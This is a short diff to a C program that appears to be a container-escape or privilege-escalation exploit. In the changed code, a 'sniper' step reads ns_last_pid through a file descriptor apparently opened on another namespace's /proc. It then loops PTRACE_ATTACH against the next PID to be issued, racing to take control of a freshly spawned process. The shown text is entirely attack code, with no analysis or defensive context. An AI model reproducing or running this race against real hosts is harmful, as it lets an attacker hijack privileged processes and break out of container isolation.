@@ -82,14 +82,33 @@ int main(int argc, char * argv[])
     }
     report("sniper");
 
-    int ret = -1;
-    time_t start = time(NULL);
-    while(ret < 0 && (time(NULL) - start) < 15)
+    int last_pid_file = openat(remote_fd, "proc/sys/kernel/ns_last_pid", O_RDONLY);
+    char read_buf[10] = {0};
+    int ret = read(last_pid_file, read_buf, 10);
+    int last_pid = atoi(read_buf);
+    close(last_pid_file);
+    my_log("last_pid", last_pid);
+
+    ret = -1;
+    while(ret < 0)
     {
-        ret = ptrace(PTRACE_ATTACH, 3, NULL, NULL);
-        if (errno != 3)
-            break;
+        for (int i = 0; i < 1000; i++)
+        {
+            ret = ptrace(PTRACE_ATTACH, last_pid + 1, NULL, NULL);
+            if (errno != 3)
+                break;
+        }
+        last_pid_file = openat(remote_fd, "proc/sys/kernel/ns_last_pid", O_RDONLY);
+        int ignore_ret = read(last_pid_file, read_buf, 10);
+        int new_last_pid = atoi(read_buf);
+        my_log("last_pid", new_last_pid);
+        if (new_last_pid != last_pid)
+        {
+            last_pid = new_last_pid;
+        }
+        close(last_pid_file);
     }
+
 	if (ret < 0)
 	{
         my_err("ptrace attach");
